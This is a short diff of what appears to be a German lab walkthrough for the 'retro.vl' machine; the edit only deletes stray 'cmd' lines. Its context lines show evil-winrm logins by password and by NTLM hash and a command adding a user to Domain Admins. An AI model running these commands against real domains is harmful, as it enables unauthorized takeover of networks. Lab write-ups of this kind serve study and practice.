@@ -240,7 +240,6 @@ evil-winrm -u harry -p 'haxxor@12345' -i <TARGET_IP>
 
 **Zu Domain Admins:**
 
-cmd
 
 ```cmd
 net group "Domain Admins" harry /add /domain
@@ -272,7 +271,6 @@ evil-winrm -i retro.vl -u 'administrator' -H '252fac7066d93dd009d4fd2cd0368389'
 
 **Child Domain Admin erreicht:**
 
-cmd
 
 ```cmd
 net group "Domain Admins" harry /add /domain
